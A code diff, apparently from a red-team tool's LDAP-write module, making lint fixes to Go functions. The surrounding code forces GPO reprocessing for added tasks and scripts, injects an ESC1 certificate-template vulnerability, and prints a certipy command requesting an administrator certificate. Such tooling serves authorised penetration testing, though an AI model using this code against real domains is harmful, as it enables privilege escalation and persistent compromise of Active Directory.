@@ -65,7 +65,7 @@ func ldapGPOAddTask(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.
 
 	// Increment version number to force GPO reprocessing
 	var version int
-	fmt.Sscanf(versionStr, "%d", &version)
+	_, _ = fmt.Sscanf(versionStr, "%d", &version)
 	// Machine version is the lower 16 bits — increment it
 	machineVersion := version & 0xFFFF
 	userVersion := (version >> 16) & 0xFFFF
@@ -124,7 +124,7 @@ func ldapGPOAddScript(conn *ldap.Conn, args ldapWriteArgs, baseDN string) struct
 	modReq.Replace("gPCMachineExtensionNames", []string{newExtNames})
 
 	var version int
-	fmt.Sscanf(versionStr, "%d", &version)
+	_, _ = fmt.Sscanf(versionStr, "%d", &version)
 	machineVersion := version & 0xFFFF
 	userVersion := (version >> 16) & 0xFFFF
 	newVersion := (userVersion << 16) | (machineVersion + 1)
@@ -172,7 +172,7 @@ func ldapTemplateESC1(conn *ldap.Conn, args ldapWriteArgs, baseDN string) struct
 
 	// CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x1 — allows requester to set SAN
 	var nameFlag int
-	fmt.Sscanf(currentNameFlag, "%d", &nameFlag)
+	_, _ = fmt.Sscanf(currentNameFlag, "%d", &nameFlag)
 	originalFlag := nameFlag
 	nameFlag |= 0x1 // Set ENROLLEE_SUPPLIES_SUBJECT
 
@@ -202,16 +202,16 @@ func ldapTemplateESC1(conn *ldap.Conn, args ldapWriteArgs, baseDN string) struct
 	}
 
 	var sb strings.Builder
-	sb.WriteString(fmt.Sprintf("ESC1 vulnerability injected into certificate template:\n"))
+	sb.WriteString("ESC1 vulnerability injected into certificate template:\n")
 	sb.WriteString(fmt.Sprintf("  Template:  %s\n", displayName))
 	sb.WriteString(fmt.Sprintf("  DN:        %s\n", templateDN))
 	sb.WriteString(fmt.Sprintf("  Name Flag: %d → %d (ENROLLEE_SUPPLIES_SUBJECT set)\n", originalFlag, nameFlag))
 	if !hasClientAuth {
-		sb.WriteString(fmt.Sprintf("  EKU:       Added Client Authentication (1.3.6.1.5.5.7.3.2)\n"))
+		sb.WriteString("  EKU:       Added Client Authentication (1.3.6.1.5.5.7.3.2)\n")
 	} else {
-		sb.WriteString(fmt.Sprintf("  EKU:       Client Authentication already present\n"))
+		sb.WriteString("  EKU:       Client Authentication already present\n")
 	}
-	sb.WriteString(fmt.Sprintf("\n  Attack: Request a certificate for any user:\n"))
+	sb.WriteString("\n  Attack: Request a certificate for any user:\n")
 	sb.WriteString(fmt.Sprintf("    certipy req -u attacker -p pass -ca <CA> -template %s -upn administrator@domain.local\n", args.Target))
 	sb.WriteString(fmt.Sprintf("\n  Rollback: Use 'ldap-write -action template-esc1-revert -target %s' to restore original values", args.Target))
 
@@ -349,10 +349,10 @@ func parseSIDString(s string) ([]byte, error) {
 	}
 
 	var revision uint8
-	fmt.Sscanf(parts[1], "%d", &revision)
+	_, _ = fmt.Sscanf(parts[1], "%d", &revision)
 
 	var authority uint64
-	fmt.Sscanf(parts[2], "%d", &authority)
+	_, _ = fmt.Sscanf(parts[2], "%d", &authority)
 
 	subAuthCount := len(parts) - 3
 	sid := make([]byte, 8+4*subAuthCount)
@@ -368,7 +368,7 @@ func parseSIDString(s string) ([]byte, error) {
 
 	for i := 0; i < subAuthCount; i++ {
 		var subAuth uint32
-		fmt.Sscanf(parts[3+i], "%d", &subAuth)
+		_, _ = fmt.Sscanf(parts[3+i], "%d", &subAuth)
 		binary.LittleEndian.PutUint32(sid[8+4*i:], subAuth)
 	}
 
